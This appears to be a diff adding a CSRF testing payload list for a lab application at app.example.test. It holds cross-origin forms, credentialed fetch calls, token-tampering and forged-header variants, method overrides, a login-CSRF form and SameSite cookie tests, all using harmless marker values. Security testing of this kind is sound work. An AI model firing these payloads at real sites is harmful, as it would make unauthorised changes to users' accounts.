@@ -1,0 +1,48 @@
+# CSRF Testing Payloads
+
+# Form-urlencoded POST: submit manually from the separate test origin
+<form action="https://app.example.test/profile/preferences" method="POST"><input name="displayName" value="csrf-form-marker"><button type="submit">Run profile test</button></form>
+
+# State-changing GET: requires endpoint support and browser cookies in the navigation context
+<a href="https://app.example.test/profile/preferences?displayName=csrf-get-marker">Run GET preference test</a>
+<form action="https://app.example.test/profile/preferences" method="GET"><input name="displayName" value="csrf-get-form"><button>Run GET form test</button></form>
+
+# Multipart form without files: test whether the same route accepts this simple content type
+<form action="https://app.example.test/profile/preferences" method="POST" enctype="multipart/form-data"><input name="displayName" value="csrf-multipart-marker"><button>Run multipart test</button></form>
+
+# text/plain JSON-shaped form: produces {"displayName":"csrf-plain-marker","padding":"="}
+<form action="https://app.example.test/profile/preferences" method="POST" enctype="text/plain"><input name='{"displayName":"csrf-plain-marker","padding":"' value='"}'><button>Run plain-text test</button></form>
+
+# Simple fetch request: response may be unreadable, but independently inspect persisted test-account state
+fetch('https://app.example.test/profile/preferences',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'displayName=csrf-fetch-marker'});
+fetch('https://app.example.test/profile/preferences',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:JSON.stringify({displayName:'csrf-text-marker'})});
+
+# Token replacement fragments: use the actual parameter name, one case per request
+csrf_token=
+csrf_token=csrf-invalid-marker
+csrf_token=null
+csrf_token[]=csrf-array-marker
+csrf_token=csrf-first-marker&csrf_token=csrf-second-marker
+csrf_token=LAB_OTHER_SESSION_CSRF_TOKEN
+
+# Header-based defense negative controls: proxy mutations, not browser-settable arbitrary headers
+X-CSRF-Token: csrf-invalid-header-marker
+X-XSRF-Token: csrf-other-session-marker
+Origin: https://csrf-origin.example.test
+Origin: https://app.example.test.csrf-origin.example.test
+Referer: https://csrf-origin.example.test/form
+
+_method=PATCH&displayName=csrf-method-patch
+_method=PUT&displayName=csrf-method-put
+
+<iframe sandbox="allow-forms allow-scripts" srcdoc="<form action='https://app.example.test/profile/preferences' method='POST'><input name='displayName' value='csrf-opaque-marker'><button>Run opaque-origin test</button></form>"></iframe>
+
+<form action="https://app.example.test/session/login" method="POST"><input name="username" value="csrf-lab-user"><input name="password" type="password" placeholder="LAB_PASSWORD"><button>Run login binding test</button></form>
+
+Cookie: csrf_lab=csrf-cookie-marker
+csrf_lab=csrf-cookie-marker&displayName=csrf-double-submit-marker
+
+# SameSite matrix: repeat the harmless form with Strict, Lax and None; Secure test cookies.
+Set-Cookie: csrf_session=LAB_STRICT_COOKIE; Path=/; Secure; HttpOnly; SameSite=Strict
+Set-Cookie: csrf_session=LAB_LAX_COOKIE; Path=/; Secure; HttpOnly; SameSite=Lax
+Set-Cookie: csrf_session=LAB_NONE_COOKIE; Path=/; Secure; HttpOnly; SameSite=None
